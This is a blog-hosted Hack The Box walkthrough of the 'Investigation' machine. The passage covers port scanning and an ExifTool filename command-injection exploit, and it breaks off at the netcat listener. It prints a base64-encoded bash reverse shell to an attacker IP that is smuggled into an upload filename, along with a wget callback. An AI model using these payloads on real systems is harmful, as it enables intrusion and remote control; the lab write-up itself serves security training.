<!DOCTYPE html>









<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  

  
    
    
    

    
      <!-- it's a local file path -->

    
  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Hack The Box - Investigation" />
<meta property="og:locale" content="en" />
<meta name="description" content="In this machine, I had to exploit a known vulnerability in exiftool, find a password in some logs, and finally reverse a program to find how to exploit it." />
<meta property="og:description" content="In this machine, I had to exploit a known vulnerability in exiftool, find a password in some logs, and finally reverse a program to find how to exploit it." />
<link rel="canonical" href="http://localhost:4000/posts/HackTheBox-Walkthrough-Investigation/" />
<meta property="og:url" content="http://localhost:4000/posts/HackTheBox-Walkthrough-Investigation/" />
<meta property="og:site_name" content="Ankit Kanojiya" />
<meta property="og:image" content="http://localhost:4000/assets/images/Investigation/Investigation.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-04-22T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/images/Investigation/Investigation.png" />
<meta property="twitter:title" content="Hack The Box - Investigation" />
<meta name="twitter:site" content="@AnkitKanojiya69" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-04-22T00:00:00+08:00","datePublished":"2023-04-22T00:00:00+08:00","description":"In this machine, I had to exploit a known vulnerability in exiftool, find a password in some logs, and finally reverse a program to find how to exploit it.","headline":"Hack The Box - Investigation","image":"http://localhost:4000/assets/images/Investigation/Investigation.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/HackTheBox-Walkthrough-Investigation/"},"url":"http://localhost:4000/posts/HackTheBox-Walkthrough-Investigation/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Hack The Box - Investigation | Ankit Kanojiya
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Ankit Kanojiya">
<meta name="application-name" content="Ankit Kanojiya">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/avtar.jpg" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title">
      <a href="/">Ankit Kanojiya</a>
    </div>
    <div class="site-subtitle font-italic">𝐄𝐭𝐡𝐢𝐜𝐚𝐥 𝐇𝐚𝐜𝐤𝐞𝐫 || 𝐒𝐨𝐟𝐭𝐰𝐚𝐫𝐞 𝐄𝐧𝐠𝐢𝐧𝐞𝐞𝐫 || 𝐂𝐲𝐛𝐞𝐫 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 𝐑𝐞𝐬𝐚𝐫𝐜𝐡𝐞𝐫.!! 𝐎𝐒𝐂𝐏 & 𝐎𝐒𝐄𝐏.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/ankit0183" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/AnkitKanojiya69" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['ankitkanojiya','yandex.ru'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Hack The Box - Investigation</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">
        





<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->


<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->

<h1 data-toc-skip>Hack The Box - Investigation</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Posted
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1682092800"
    data-df="ll"
    data-toggle="tooltip" data-placement="bottom">
  Apr 22, 2023
</em>

    </span>

    <!-- lastmod date -->
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="/assets/images/Investigation/Investigation.png" class="preview-img bg"
        alt="Preview Image"

      

       data-proofer-ignore>

      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author(s) -->
    <span>
      

      By

      <em>
      
        <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>
      
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="1537 words">
  <em>8 min</em> read</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>In this machine, I had to exploit a known vulnerability in exiftool, find a password in some logs, and finally reverse a program to find how to exploit it.</p>

<ul>
  <li>Room: Investigation</li>
  <li>Difficulty: Medium</li>
  <li>URL: <a href="https://app.hackthebox.com/machines/Investigation">https://app.hackthebox.com/machines/Investigation</a></li>
  <li>Author: <a href="https://app.hackthebox.com/users/15515">Derezzed</a></li>
</ul>

<h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I began the box by running Rustscan to look for open ports.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">rustscan</span> <span class="o">-</span><span class="n">a</span> <span class="n">target</span> <span class="o">--</span> <span class="o">-</span><span class="nc">A</span> <span class="o">|</span> <span class="n">tee</span> <span class="n">rust</span><span class="mf">.</span><span class="n">txt</span>
<span class="mf">.</span><span class="o">----.</span> <span class="mf">.</span><span class="o">-.</span> <span class="mf">.</span><span class="o">-.</span> <span class="mf">.</span><span class="o">----..---.</span>  <span class="mf">.</span><span class="o">----.</span> <span class="mf">.</span><span class="o">---.</span>   <span class="mf">.</span><span class="o">--.</span>  <span class="mf">.</span><span class="o">-.</span> <span class="mf">.</span><span class="o">-.</span>
<span class="o">|</span> <span class="p">{}</span>  <span class="p">}</span><span class="o">|</span> <span class="p">{</span> <span class="p">}</span> <span class="o">|</span><span class="p">{</span> <span class="p">{</span><span class="n">__</span> <span class="p">{</span><span class="n">_</span>   <span class="n">_</span><span class="p">}{</span> <span class="p">{</span><span class="n">__</span>  <span class="o">/</span>  <span class="n">___</span><span class="p">}</span> <span class="o">/</span> <span class="p">{}</span> <span class="err">\</span> <span class="o">|</span>  <span class="sb">`| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`</span><span class="o">-</span><span class="s1">' `-'</span><span class="sb">`-----'`</span><span class="o">----</span><span class="s1">'  `-'</span>  <span class="sb">`----'  `</span><span class="o">---</span><span class="s1">' `-'</span>  <span class="sb">`-'`</span><span class="o">-</span><span class="s1">' `-'</span>
<span class="nc">The</span> <span class="nc">Modern</span> <span class="nc">Day</span> <span class="nc">Port</span> <span class="nc">Scanner</span><span class="mf">.</span>
<span class="nb">________________________________________</span>
<span class="o">:</span> <span class="n">https</span><span class="o">://</span><span class="n">discord</span><span class="mf">.</span><span class="n">gg</span><span class="o">/</span><span class="nc">GFrQsGy</span>           <span class="o">:</span>
<span class="o">:</span> <span class="n">https</span><span class="o">://</span><span class="n">github</span><span class="mf">.</span><span class="n">com</span><span class="o">/</span><span class="nc">RustScan</span><span class="o">/</span><span class="nc">RustScan</span> <span class="o">:</span>
 <span class="o">--------------------------------------</span>
<span class="err">😵</span> <span class="n">https</span><span class="o">://</span><span class="n">admin</span><span class="mf">.</span><span class="n">tryhackme</span><span class="mf">.</span><span class="n">com</span>

<span class="p">[</span><span class="o">~</span><span class="p">]</span> <span class="nc">The</span> <span class="n">config</span> <span class="n">file</span> <span class="n">is</span> <span class="n">expected</span> <span class="n">to</span> <span class="n">be</span> <span class="n">at</span> <span class="s2">"/home/ehogue/.rustscan.toml"</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">File</span> <span class="n">limit</span> <span class="n">is</span> <span class="n">lower</span> <span class="n">than</span> <span class="k">default</span> <span class="n">batch</span> <span class="n">size</span><span class="mf">.</span> <span class="nc">Consider</span> <span class="n">upping</span> <span class="n">with</span> <span class="o">--</span><span class="n">ulimit</span><span class="mf">.</span> <span class="nc">May</span> <span class="n">cause</span> <span class="n">harm</span> <span class="n">to</span> <span class="n">sensitive</span> <span class="n">servers</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">Your</span> <span class="n">file</span> <span class="n">limit</span> <span class="n">is</span> <span class="n">very</span> <span class="n">small</span><span class="p">,</span> <span class="n">which</span> <span class="n">negatively</span> <span class="n">impacts</span> <span class="nc">RustScan</span><span class="s1">'s speed. Use the Docker image, or up the Ulimit with '</span><span class="o">--</span><span class="n">ulimit</span> <span class="mi">5000</span><span class="err">'</span><span class="mf">.</span>
<span class="nc">Open</span> <span class="mf">10.10.11.197</span><span class="o">:</span><span class="mi">22</span>
<span class="nc">Open</span> <span class="mf">10.10.11.197</span><span class="o">:</span><span class="mi">80</span>

<span class="nc">Host</span> <span class="n">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">syn</span><span class="o">-</span><span class="nf">ack</span> <span class="p">(</span><span class="mf">0.048</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="mf">.</span>
<span class="nc">Scanned</span> <span class="n">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mo">02</span><span class="o">-</span><span class="mi">19</span> <span class="mo">07</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mi">55</span> <span class="no">EST</span> <span class="k">for</span> <span class="mi">15</span><span class="n">s</span>

<span class="no">PORT</span>   <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">REASON</span>  <span class="no">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">ssh</span>     <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="nc">OpenSSH</span> <span class="mf">8.2</span><span class="n">p1</span> <span class="nc">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="mf">.5</span> <span class="p">(</span><span class="nc">Ubuntu</span> <span class="nc">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="o">:</span>
<span class="o">|</span>   <span class="mi">3072</span> <span class="mi">2</span><span class="nf">f1e6306aa6ebbcc0d19d4152674c6d9</span> <span class="p">(</span><span class="no">RSA</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">rsa</span> <span class="nc">AAAAB3NzaC1yc2EAAAADAQABAAABgQC8CUW</span><span class="o">+</span><span class="n">gkrjaTI</span><span class="o">+</span><span class="nc">EeIVcW</span><span class="o">/</span><span class="mi">8</span><span class="n">kCM0oaKxGk63NkzFaKj8cgPfImUg8NbMX7xSoQR2DJP88LCJWpm</span><span class="o">/</span><span class="mi">7</span><span class="nc">KgYyHgaI4w29TRZTGFrv1MKoALQKO</span><span class="o">/</span><span class="mi">6</span><span class="nc">GDUxLtoHaSA1KrXph74L9eNp</span><span class="o">/</span><span class="nc">Q</span><span class="o">/</span><span class="n">xAzmjfNqLL3qCAotSUZndEWV7C7EQYj73e88Rvw</span><span class="o">+</span><span class="n">bV8mQ0O</span><span class="o">+</span><span class="n">habEygGVEFuEgOJpN0e3YM3EJoxo1N5CVJMBUJ4Jb7FoYYckIAYTZTV3fuembGRoG0Lvw6YbIOYA8URxLqcBxsMSOkznhf219fl2KXiT9Y7505L</span><span class="o">/</span><span class="nc">HAeWG4NW4LAuDereMuaUDe4vWEMHYx0KH7m3UuJ7zxcPqHU7K94KW8cZVNlWjoNPDKrPTEgPDfDRlUNpVRyE87DcBgOzNGNFJHYhj2K46RKtv</span><span class="o">+</span><span class="nc">TO9MjYKvC</span><span class="o">+</span><span class="n">nXFSNgPkdFaCQcfpqd61FtaVsin5Ho</span><span class="o">/</span><span class="n">v1XfhqDG0d7N7uDM28zCmNVfnl9</span><span class="o">+</span><span class="nc">MI0jpBmiFaH8V0ZjR7EZlkk</span><span class="o">+</span><span class="mi">7</span><span class="nc">Xb3bI2Kq3KVaif7s</span><span class="o">=</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">274520</span><span class="nf">add2faa73a8373d97c79abf30b</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ecdsa</span><span class="o">-</span><span class="n">sha2</span><span class="o">-</span><span class="n">nistp256</span> <span class="nc">AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBG5ZpYGYsM</span><span class="o">/</span><span class="n">eNsAOYy3iQ9O7</span><span class="o">/</span><span class="nc">OdK6q63GKK1bd2ZA5qhePdO</span><span class="o">+</span><span class="nc">KJOOvgwxKxBXoJApVfBKV0oVn3ztPubO2mdp5g</span><span class="o">=</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">4245</span><span class="nf">eb916e21020617b2748bc5834fe0</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
<span class="o">|</span><span class="n">_ssh</span><span class="o">-</span><span class="n">ed25519</span> <span class="nc">AAAAC3NzaC1lZDI1NTE5AAAAIJ4m4ta</span><span class="o">/</span><span class="nc">VBtbCv</span><span class="o">+</span><span class="mi">5</span><span class="nc">FEPfydbXySZHyzU7ELt9lBsbjl5S</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="n">open</span>  <span class="n">http</span>    <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="nc">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.41</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="o">:</span> <span class="nc">Did</span> <span class="n">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">http</span><span class="o">://</span><span class="n">eforenzics</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span>
<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="o">:</span>
<span class="o">|</span><span class="n">_</span>  <span class="nc">Supported</span> <span class="nc">Methods</span><span class="o">:</span> <span class="no">GET</span> <span class="no">HEAD</span> <span class="no">POST</span> <span class="no">OPTIONS</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="o">:</span> <span class="nc">Apache</span><span class="o">/</span><span class="mf">2.4.41</span> <span class="p">(</span><span class="nc">Ubuntu</span><span class="p">)</span>
<span class="nc">Service</span> <span class="nc">Info</span><span class="o">:</span> <span class="nc">Host</span><span class="o">:</span> <span class="n">eforenzics</span><span class="mf">.</span><span class="n">htb</span><span class="p">;</span> <span class="no">OS</span><span class="o">:</span> <span class="nc">Linux</span><span class="p">;</span> <span class="no">CPE</span><span class="o">:</span> <span class="n">cpe</span><span class="o">:/</span><span class="n">o</span><span class="o">:</span><span class="n">linux</span><span class="o">:</span><span class="n">linux_kernel</span>
<span class="mf">...</span>
<span class="nc">Nmap</span> <span class="n">done</span><span class="o">:</span> <span class="mi">1</span> <span class="no">IP</span> <span class="nf">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="n">in</span> <span class="mf">15.11</span> <span class="n">seconds</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Two ports were open:</p>
<ul>
  <li>22 - SSH</li>
  <li>80 - HTTP</li>
</ul>

<p>Port 80 was redirecting to ‘http://eforenzics.htb/’ so I added that to my hosts files. I used Feroxbuster to look for hidden files, and wfuzz to look for subdomains. They did not find anything interesting.</p>

<h2 id="file-upload"><span class="mr-2">File Upload</span><a href="#file-upload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I opened the website in a browser.</p>

<p><img data-src="/assets/images/Investigation/eForenzicsSite.png" alt="eForenzics Site" title="eForenzics Site" data-proofer-ignore></p>

<p>The website was mostly static. Except for the ‘Free Services’ page that allowed uploading files.</p>

<p><img data-src="/assets/images/Investigation/FileUpload.png" alt="File Upload" title="File Upload" data-proofer-ignore></p>

<p>I tried uploading an image to the site. The image was uploaded, and I was given a link to view an analysis report on the file.</p>

<p><img data-src="/assets/images/Investigation/FileUploaded.png" alt="File Uploaded" title="File Uploaded" data-proofer-ignore></p>

<p>I clicked on the link. It took me to a page that displayed the file image’s metadata extracted with <a href="https://exiftool.org/">ExifTool</a>.</p>

<p><img data-src="/assets/images/Investigation/ExifTool.png" alt="ExifTool Results" title="ExifTool Results" data-proofer-ignore></p>

<p>Seeing file uploads, I thought I might be able to get <a href="https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/">Local File Inclusion</a>, but I was not able to access the uploaded files, just the text file with the ExifTool results.</p>

<p>I tried adding PHP code to the image description, but it was not executed. I also tried to append commands after the file hoping they would be sent to the command line and executed. That also failed.</p>

<p>I looked for known vulnerabilities in ExifTool version 12.37 and <a href="https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429">found one</a>. I was trying to add commands at the end of the file name, but I had to add in at the beginning and end it with a pipe (|).</p>

<p>I tried it by beginning with something simple. I could not run something like <code class="language-plaintext highlighter-rouge">id</code> because the output was not displayed. So I tried starting a web server and sending a file called <code class="language-plaintext highlighter-rouge">wget 10.10.14.11 |</code> with Burp Repeater.</p>

<p>It worked.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">80</span>
<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="p">...</span>
<span class="mf">10.10</span><span class="p">.</span><span class="mf">11.197</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">19</span><span class="o">/</span><span class="n">Feb</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">09</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">26</span><span class="p">]</span> <span class="s">"GET / HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Next, I went for a reverse shell. To minimize the risk of having issues with special characters, I started by base64 encoding my payload.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="k">echo</span> <span class="s1">'bash  -i &gt;&amp; /dev/tcp/10.10.14.8/4444  0&gt;&amp;1  '</span> <span class="o">|</span> <span class="n">base64</span>
<span class="nc">YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDQ0ICAwPiYxICAK</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Then I sent it in the filename.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nc">Content</span><span class="o">-</span><span class="nc">Disposition</span><span class="o">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">"image"</span><span class="p">;</span> <span class="n">filename</span><span class="o">=</span><span class="s2">"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC80NDQ0ICAwPiYxICAK | base64 -d | bash |"</span>
<span class="nc">Content</span><span class="o">-</span><span class="nc">Type</span><span class="o">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">php</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I got my reverse shell.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">klvnp</span> <span class="mi">4444</span>
